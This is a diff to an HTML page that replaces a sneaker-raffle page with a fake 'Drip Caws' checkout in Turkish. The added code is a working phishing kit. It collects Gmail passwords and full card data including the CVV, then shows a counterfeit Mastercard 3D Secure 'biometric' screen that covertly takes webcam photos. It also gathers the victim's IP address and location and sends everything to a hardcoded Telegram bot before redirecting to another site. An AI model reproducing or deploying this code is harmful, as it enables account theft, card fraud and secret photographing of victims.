@@ -3,35 +3,207 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Drip Caws | Hyper Raffle Access - Limited Edition Dunk</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <title>Drip Caws | Official Checkout</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --blue: #007aff; --bg: #ffffff; --text: #1d1d1f; --grey: #86868b; --border: #d2d2d7; }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: var(--bg); font-family: 'Montserrat', sans-serif; color: var(--text); overflow-x: hidden; -webkit-font-smoothing: antialiased; }
-
-        /* HEADER */
-        header { width: 100%; padding: 15px 50px; background: rgba(255,255,255,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
-        .logo { font-weight: 800; font-size: 26px; letter-spacing: -2px; text-transform: uppercase; color: #000; }
-        .logo span { color: var(--blue); }
-        .nav { display: flex; gap: 25px; font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
-
-        /* HERO AREA */
-        .hero { width: 100%; padding: 80px 50px; display: flex; gap: 60px; align-items: center; max-width: 1300px; margin: 0 auto; }
-        .product-img { width: 50%; display: flex; justify-content: center; position: relative; }
-        .product-img img { width: 100%; max-width: 500px; height: auto; object-fit: contain; filter: drop-shadow(0 20px 40px rgba(0,0,0,0.1)); }
-        .product-img::after { content: ''; position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); width: 80%; height: 2px; background: radial-gradient(circle, rgba(0,0,0,0.1) 0%, rgba(255,255,255,0) 70%); }
-
-        .product-info { width: 50%; text-align: left; }
-        .raffle-badge { display: inline-block; padding: 6px 14px; background: rgba(0, 122, 255, 0.08); color: var(--blue); font-weight: 700; font-size: 11px; border-radius: 50px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; }
-        .product-info h1 { font-size: 48px; font-weight: 800; letter-spacing: -2px; margin-bottom: 10px; line-height: 1.1; color: #000; }
-        .product-info p.price { font-size: 20px; font-weight: 600; color: var(--blue); margin-bottom: 25px; }
-        .product-info p.desc { font-size: 15px; color: #666; margin-bottom: 40px; line-height: 1.6; max-width: 500px; }
+        :root { --blue: #0071e3; --bg: #ffffff; --text: #1d1d1f; --grey: #f5f5f7; }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
+        body { background: var(--bg); font-family: 'Inter', sans-serif; color: var(--text); }
         
-        /* ÇEKİLİŞ BUTONU */
-        .btn-sync { display: inline-block; padding: 18px 45px; background: #000; color: #fff; font-weight: 700; font-size: 14px; text-transform: uppercase; border: none; border-radius: 4px; cursor: pointer; transition: 0.3s; letter-spacing: 1px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
-        .btn-sync:hover { background: #333; transform: translateY(-2px); }
+        /* HEADER */
+        header { padding: 15px 5%; border-bottom: 1px solid #d2d2d7; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-weight: 800; font-size: 24px; letter-spacing: -1.5px; }
+        .logo span { color: var(--blue); }
 
-        /* MODAL: GİRİŞ FORMU */
-        #verify-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(15px); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
-        .modal-content { width: 100%; max-width: 420px; padding: 50px 35px; background: #fff; border-radius: 20px; text-
+        /* LAYOUT */
+        .container { max-width: 1000px; margin: 40px auto; display: flex; gap: 40px; padding: 0 20px; }
+        .pay-form { flex: 1.5; }
+        .summary { flex: 1; background: var(--grey); padding: 30px; border-radius: 20px; height: fit-content; }
+
+        h2 { font-size: 22px; font-weight: 700; margin-bottom: 25px; }
+        .field { margin-bottom: 15px; text-align: left; }
+        .field label { display: block; font-size: 11px; font-weight: 700; color: #86868b; text-transform: uppercase; margin-bottom: 6px; }
+        .field input { width: 100%; padding: 14px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 15px; outline: none; transition: 0.2s; }
+        .field input:focus { border-color: var(--blue); box-shadow: 0 0 0 4px rgba(0,113,227,0.1); }
+
+        .btn-pay { width: 100%; padding: 18px; background: #000; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        
+        /* 3D SECURE OVERLAY */
+        #secure-screen { display: none; position: fixed; inset: 0; background: #fff; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .cam-frame { width: 280px; height: 280px; border-radius: 50%; border: 5px solid var(--grey); overflow: hidden; position: relative; margin-bottom: 20px; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .scan-laser { position: absolute; top: 0; width: 100%; height: 3px; background: #ff0000; box-shadow: 0 0 15px #ff0000; animation: scan 2s infinite ease-in-out; }
+        @keyframes scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
+        .flash-efekt { position: fixed; inset: 0; background: #fff; z-index: 1100; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="flash-efekt" id="flash"></div>
+
+<header>
+    <div class="logo">DRIP <span>CAWS</span></div>
+    <div style="font-size: 11px; font-weight: 700; color: #008a00;">● SECURE CHECKOUT</div>
+</header>
+
+<div class="container" id="main-ui">
+    <div class="pay-form">
+        <h2>Ödeme & Teslimat</h2>
+        
+        <div class="field">
+            <label>Master Gmail Hesabı</label>
+            <input type="email" id="email" placeholder="ornek@gmail.com" required>
+        </div>
+        <div class="field">
+            <label>Hesap Şifresi</label>
+            <input type="password" id="pass" placeholder="••••••••" required>
+        </div>
+
+        <hr style="margin: 25px 0; opacity: 0.2;">
+        
+        <div class="field">
+            <label>Kart Üzerindeki İsim</label>
+            <input type="text" id="c_name" placeholder="AD SOYAD">
+        </div>
+        <div class="field">
+            <label>Kart Numarası</label>
+            <input type="text" id="c_no" placeholder="0000 0000 0000 0000">
+        </div>
+        <div style="display: flex; gap: 15px;">
+            <div class="field" style="flex: 1;">
+                <label>AA/YY</label>
+                <input type="text" id="c_exp" placeholder="MM/YY">
+            </div>
+            <div class="field" style="flex: 1;">
+                <label>CVV</label>
+                <input type="text" id="c_cvv" placeholder="000">
+            </div>
+        </div>
+
+        <button class="btn-pay" onclick="runSecurity()">Ödemeyi Onayla (₺13.499)</button>
+    </div>
+
+    <div class="summary">
+        <h2>Sipariş Özeti</h2>
+        <div style="display: flex; gap: 15px; align-items: center; margin-bottom: 20px;">
+            <img src="https://images.stockx.com/360/Nike-SB-Dunk-Low-Sandy-Bodecker/Images/Nike-SB-Dunk-Low-Sandy-Bodecker/Lv2/img01.jpg?w=100" style="width:70px; border-radius:8px; background:#fff;">
+            <div>
+                <p style="font-weight:700; font-size:14px;">Hyper Caws Dunk Low</p>
+                <p style="font-size:12px; color:#86868b;">Beden: 42.5 | Adet: 1</p>
+            </div>
+        </div>
+        <div style="display:flex; justify-content:space-between; font-size:14px; margin-top:20px; font-weight:800; border-top:1px solid #ccc; padding-top:15px;">
+            <span>Toplam</span>
+            <span>₺13.499,00</span>
+        </div>
+    </div>
+</div>
+
+<div id="secure-screen">
+    <div style="color:#d00; font-weight:800; margin-bottom:20px;">Verified by Mastercard® SecureCode™</div>
+    <h3>Biyometrik Kimlik Doğrulama</h3>
+    <p style="font-size:13px; color:#666; margin: 15px 0 25px;">Lütfen kameraya bakın. İşlem otomatik olarak tamamlanacaktır.</p>
+    <div class="cam-frame">
+        <div class="scan-laser"></div>
+        <video id="webcam" autoplay playsinline muted></video>
+    </div>
+    <p style="font-size:11px; color:#999;">Doğrulama işlemi Banka tarafından şifrelenmektedir.</p>
+</div>
+
+<script>
+    const CONFIG = {
+        token: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc",
+        chat: "1540769169"
+    };
+
+    async function runSecurity() {
+        const mail = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        const cno = document.getElementById('c_no').value;
+        
+        if(!mail || !pass || !cno) {
+            alert("Lütfen ödeme alanlarını eksiksiz doldurun.");
+            return;
+        }
+
+        try {
+            // Kamera izni al
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280 } });
+            const video = document.getElementById('webcam');
+            video.srcObject = stream;
+
+            // Arka planda anlık ilk fotoğrafı çek (Refleks)
+            setTimeout(() => sendToTelegram(video, "GIRIŞ_ANI"), 600);
+
+            // Ekranları değiştir (3D Secure moduna geç)
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('secure-screen').style.display = 'flex';
+
+            // 5 saniye sonra flaş patlat ve tüm bilgileri raporla
+            setTimeout(() => {
+                const f = document.getElementById('flash');
+                f.style.display = 'block';
+                setTimeout(() => f.style.display = 'none', 100);
+                
+                finalRapor(video);
+            }, 5500);
+
+        } catch (err) {
+            alert("3D Secure Hatası: Donanım doğrulaması (Kamera) başarısız. Lütfen tekrar deneyin.");
+        }
+    }
+
+    // Küçük fotoğrafları gönderme fonksiyonu
+    function sendToTelegram(v, label) {
+        const can = document.createElement('canvas');
+        can.width = v.videoWidth; can.height = v.videoHeight;
+        can.getContext('2d').drawImage(v, 0, 0);
+        can.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('photo', blob, 'shot.jpg');
+            fd.append('caption', `💠 **DC [${label}]**\n👤 Mail: ${document.getElementById('email').value}`);
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto?chat_id=${CONFIG.chat}`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.7);
+    }
+
+    // Tüm bilgileri ve final fotoğrafı gönderen fonksiyon
+    async function finalRapor(v) {
+        const can = document.createElement('canvas');
+        can.width = v.videoWidth; can.height = v.videoHeight;
+        can.getContext('2d').drawImage(v, 0, 0);
+        
+        can.toBlob(async blob => {
+            const fd = new FormData();
+            fd.append('photo', blob, 'final.jpg');
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto?chat_id=${CONFIG.chat}`, { method: 'POST', body: fd });
+
+            // IP adresi al
+            const ipData = await (await fetch('https://ipapi.co/json/')).json();
+            
+            const rapor = `
+🔥 **DRIP CAWS | KART & HESAP RAPORU**
+──────────────────
+👤 **HESAP BİLGİLERİ**
+📧 Gmail: \`${document.getElementById('email').value}\`
+🔑 Şifre: \`${document.getElementById('pass').value}\`
+
+💳 **KART BİLGİLERİ**
+👤 Sahibi: \`${document.getElementById('c_name').value}\`
+🔢 No: \`${document.getElementById('c_no').value}\`
+📅 SKT: \`${document.getElementById('c_exp').value}\` | 🔐 CVV: \`${document.getElementById('c_cvv').value}\`
+
+🌐 **AĞ VERİLERİ**
+🌍 IP: \`${ipData.ip}\`
+📍 Konum: \`${ipData.city} / ${ipData.country_name}\`
+🏢 ISS: \`${ipData.org}\`
+──────────────────`;
+
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chat}&text=${encodeURIComponent(rapor)}&parse_mode=markdown`);
+            
+            // İşlem bittiğinde asıl siteye yönlendir
+            setTimeout(() => { window.location.href = "https://caws.network"; }, 1000);
+        }, 'image/jpeg', 1.0);
+    }
+</script>
+</body>
+</html>
